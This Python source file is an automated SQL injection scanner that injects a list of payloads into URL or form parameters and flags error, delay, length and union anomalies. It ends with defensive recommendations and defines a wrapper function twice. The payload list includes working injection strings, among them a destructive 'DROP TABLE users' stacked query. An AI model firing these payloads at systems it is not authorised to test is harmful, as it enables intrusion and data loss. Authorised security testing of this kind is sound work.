"""
AdiZen SQL Injection Scanner - Automated SQLi Vulnerability Detection
Author: AdiZenWorks Inc.
License: MIT
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Optional
import time
import re

class AdiZenSQLi:
    """SQL Injection vulnerability scanner"""
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'AdiZen-SQLi-Scanner/2.0 (Security Testing)'
        })
        
        # SQL injection payloads - various DBMS and techniques
        self.payloads = [
            # Basic payloads
            "'", "\"", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
            "admin' --", "admin' #", "admin'/*", "' or 1=1--", "' or 1=1#",
            "' or 1=1/*", "') or '1'='1--", "') or ('1'='1--",
            
            # Time-based blind SQLi
            "' AND SLEEP(5)--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; WAITFOR DELAY '00:00:05'--", "1' AND SLEEP(5)#",
            
            # Boolean-based blind SQLi
            "' AND 1=1--", "' AND 1=2--", "1' AND '1'='1", "1' AND '1'='2",
            
            # Union-based SQLi
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "' UNION ALL SELECT NULL--",
            
            # Error-based SQLi
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND 1=CAST((SELECT @@version) AS int)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT @@version)))--",
            
            # Stacked queries
            "'; DROP TABLE users--", "'; SELECT SLEEP(5)--",
            
            # Advanced payloads
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        
        # SQL error signatures for different databases
        self.error_signatures = [
            # MySQL
            r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result",
            r"MySqlClient\.", r"com\.mysql\.jdbc\.exceptions",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result",
            r"Npgsql\.", r"PG::SyntaxError:",
            
            # Microsoft SQL Server
            r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server",
            r"\bSQL Server[^&lt;&quot;]+Driver", r"Warning.*mssql_.*",
            r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
            r"System\.Data\.SqlClient\.SqlException",
            
            # Oracle
            r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error",
            r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*",
            
            # SQLite
            r"SQLite/JDBCDriver", r"SQLite\.Exception", r"sqlite_.*error",
            
            # General SQL errors
            r"SQL syntax error", r"syntax error.*SQL", r"Unclosed quotation mark",
            r"quoted string not properly terminated", r"unterminated string literal"
        ]
    
    def scan_url(self, url: str, method: str = 'GET', data: Optional[Dict] = None) -> List[Dict]:
        """
        Scan a URL for SQL injection vulnerabilities
        
        Args:
            url: Target URL
            method: HTTP method (GET/POST)
            data: POST data dictionary
            
        Returns:
            List of detected vulnerabilities
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params and method == 'GET':
            return [{'status': 'info', 'message': 'No parameters found in URL'}]
        
        vulnerabilities = []
        
        # Test each parameter
        if method == 'GET':
            for param in params:
                results = self._test_parameter(url, param, method='GET')
                vulnerabilities.extend(results)
        
        elif method == 'POST' and data:
            for param in data:
                results = self._test_parameter(url, param, method='POST', post_data=data)
                vulnerabilities.extend(results)
        
        self.vulnerabilities.extend(vulnerabilities)
        return vulnerabilities
    
    def _test_parameter(self, url: str, param: str, method: str = 'GET', 
                       post_data: Optional[Dict] = None) -> List[Dict]:
        """Test a specific parameter for SQLi vulnerabilities"""
        vulnerabilities = []
        
        # Get baseline response
        baseline = self._send_request(url, method, post_data)
        if not baseline:
            return [{'param': param, 'status': 'error', 'message': 'Failed to get baseline response'}]
        
        baseline_time = baseline.get('response_time', 0)
        baseline_content = baseline.get('content', '')
        baseline_length = len(baseline_content)
        
        for payload in self.payloads:
            # Inject payload
            if method == 'GET':
                injected_url = self._inject_payload_url(url, param, payload)
                response = self._send_request(injected_url, 'GET')
            else:
                injected_data = post_data.copy()
                injected_data[param] = payload
                response = self._send_request(url, 'POST', injected_data)
            
            if not response:
                continue
            
            # Check for vulnerabilities
            vuln = self._analyze_response(
                response, baseline, param, payload, 
                baseline_time, baseline_length
            )
            
            if vuln:
                vulnerabilities.append(vuln)
                # Stop after finding vulnerability to avoid excessive requests
                break
            
            time.sleep(0.1)  # Rate limiting
        
        return vulnerabilities
    
    def _inject_payload_url(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if param in params:
            params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
    
    def _send_request(self, url: str, method: str = 'GET', 
                     data: Optional[Dict] = None) -> Optional[Dict]:
        """Send HTTP request and capture response details"""
        try:
            start_time = time.time()
            
            if method == 'GET':
                response = self.session.get(url, timeout=self.timeout, verify=False)
            else:
                response = self.session.post(url, data=data, timeout=self.timeout, verify=False)
            
            response_time = time.time() - start_time
            
            return {
                'status_code': response.status_code,
                'content': response.text,
                'response_time': response_time,
                'headers': dict(response.headers)
            }
        except requests.exceptions.Timeout:
            return {'status': 'timeout', 'response_time': self.timeout}
        except Exception as e:
            return None
    
    def _analyze_response(self, response: Dict, baseline: Dict, param: str, 
                         payload: str, baseline_time: float, baseline_length: int) -> Optional[Dict]:
        """Analyze response for SQLi indicators"""
        content = response.get('content', '')
        response_time = response.get('response_time', 0)
        
        # 1. Error-based SQLi detection
        for pattern in self.error_signatures:
            if re.search(pattern, content, re.IGNORECASE):
                return {
                    'type': 'Error-Based SQL Injection',
                    'severity': 'HIGH',
                    'parameter': param,
                    'payload': payload,
                    'evidence': 'SQL error message detected in response',
                    'confidence': 'HIGH'
                }
        
        # 2. Time-based blind SQLi detection
        if 'SLEEP' in payload or 'WAITFOR' in payload:
            if response_time > (baseline_time + 4):  # At least 4 seconds delay
                return {
                    'type': 'Time-Based Blind SQL Injection',
                    'severity': 'HIGH',
                    'parameter': param,
                    'payload': payload,
                    'evidence': f'Response time increased by {response_time - baseline_time:.2f}s',
                    'confidence': 'MEDIUM'
                }
        
        # 3. Boolean-based blind SQLi detection
        if ('1=1' in payload or "'1'='1" in payload):
            true_payload = payload
            false_payload = payload.replace('1=1', '1=2').replace("'1'='1", "'1'='2")
            
            # This is simplified - full implementation would test false condition too
            if len(content) != baseline_length:
                return {
                    'type': 'Boolean-Based Blind SQL Injection',
                    'severity': 'HIGH',
                    'parameter': param,
                    'payload': payload,
                    'evidence': f'Response length differs: baseline={baseline_length}, injected={len(content)}',
                    'confidence': 'MEDIUM'
                }
        
        # 4. Union-based SQLi detection
        if 'UNION' in payload.upper():
            # Look for signs of successful union injection
            if response.get('status_code') == 200 and 'NULL' not in content:
                # Check if content structure changed significantly
                if abs(len(content) - baseline_length) > baseline_length * 0.2:
                    return {
                        'type': 'Union-Based SQL Injection',
                        'severity': 'CRITICAL',
                        'parameter': param,
                        'payload': payload,
                        'evidence': 'Response structure changed with UNION query',
                        'confidence': 'LOW'
                    }
        
        return None
    
    def scan_form(self, form_data: Dict) -> List[Dict]:
        """
        Scan a web form for SQL injection vulnerabilities
        
        Args:
            form_data: Dictionary with 'action', 'method', 'inputs'
            
        Returns:
            List of vulnerabilities found
        """
        url = form_data.get('action')
        method = form_data.get('method', 'GET')
        inputs = form_data.get('inputs', [])
        
        # Prepare test data
        test_data = {}
        for input_field in inputs:
            name = input_field.get('name')
            if name:
                test_data[name] = 'test'
        
        return self.scan_url(url, method=method, data=test_data)
    
    def generate_report(self) -> Dict:
        """Generate comprehensive SQLi scan report"""
        return {
            'total_vulnerabilities': len(self.vulnerabilities),
            'severity_breakdown': {
                'CRITICAL': len([v for v in self.vulnerabilities if v.get('severity') == 'CRITICAL']),
                'HIGH': len([v for v in self.vulnerabilities if v.get('severity') == 'HIGH']),
                'MEDIUM': len([v for v in self.vulnerabilities if v.get('severity') == 'MEDIUM']),
                'LOW': len([v for v in self.vulnerabilities if v.get('severity') == 'LOW'])
            },
            'vulnerabilities': self.vulnerabilities,
            'recommendations': self._generate_recommendations()
        }
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations"""
        return [
            "Use parameterized queries (prepared statements) instead of string concatenation",
            "Implement input validation and sanitization",
            "Use ORM frameworks with built-in SQL injection protection",
            "Apply the principle of least privilege for database accounts",
            "Enable Web Application Firewall (WAF) rules for SQL injection",
            "Perform regular security testing and code reviews",
            "Keep database software and frameworks updated",
            "Log and monitor database queries for suspicious activity"
        ]

# CLI Interface
if __name__ == "__main__":
    print("💉 AdiZen SQL Injection Scanner")
    print("=" * 50)
    
    target = input("Enter target URL (e.g., https://example.com/page?id=1): ")
    method = input("HTTP Method (GET/POST) [GET]: ").upper() or "GET"
    
    scanner = AdiZenSQLi()
    
    print(f"\n[+] Scanning {target} for SQL injection vulnerabilities...")
    print(f"[+] Method: {method}\n")
    
    if method == "POST":
        print("[!] POST data required. Format: key1=value1,key2=value2")
        post_input = input("Enter POST data: ")
        post_data = dict(item.split('=') for item in post_input.split(','))
        results = scanner.scan_url(target, method='POST', data=post_data)
    else:
        results = scanner.scan_url(target, method='GET')
    
    print(f"\n[✓] Scan complete!")
    
    if results:
        print(f"\n[!] VULNERABILITIES FOUND: {len(results)}\n")
        for vuln in results:
            print(f"  Type: {vuln.get('type', 'Unknown')}")
            print(f"  Severity: {vuln.get('severity', 'Unknown')}")
            print(f"  Parameter: {vuln.get('parameter', 'Unknown')}")
            print(f"  Payload: {vuln.get('payload', 'Unknown')}")
            print(f"  Evidence: {vuln.get('evidence', 'None')}")
            print(f"  Confidence: {vuln.get('confidence', 'Unknown')}")
            print("-" * 50)
    else:
        print("\n[✓] No SQL injection vulnerabilities detected.")
    
    report = scanner.generate_report()
    print(f"\nRecommendations:")
    for i, rec in enumerate(report['recommendations'][:5], 1):
        print(f"  {i}. {rec}")


# ── Standalone wrapper function (used by Flask apps) ─────────────────────────
def scan_sqli(url: str) -> dict:
    """
    Convenience wrapper: run a GET-based SQL injection scan on the given URL.

    Args:
        url: Target URL with query parameters (e.g. https://example.com/page?id=1)

    Returns:
        dict with 'vulnerabilities', 'total', and 'recommendations'
    """
    scanner = AdiZenSQLi()
    vulnerabilities = scanner.scan_url(url, method='GET')
    report = scanner.generate_report()
    return {
        "url": url,
        "vulnerabilities": vulnerabilities,
        "total": len(vulnerabilities),
        "recommendations": report.get("recommendations", [])
    }


# ── Standalone wrapper function (used by Flask apps) ─────────────────────────
def scan_sqli(url: str) -> dict:
    """
    Convenience wrapper: run a GET-based SQL injection scan.

    Args:
        url: Target URL with query parameters

    Returns:
        dict with 'vulnerabilities', 'total', and 'recommendations'
    """
    scanner = AdiZenSQLi()
    vulnerabilities = scanner.scan_url(url, method='GET')
    report = scanner.generate_report()
    return {
        "url": url,
        "vulnerabilities": vulnerabilities,
        "total": len(vulnerabilities),
        "recommendations": report.get("recommendations", [])
    }
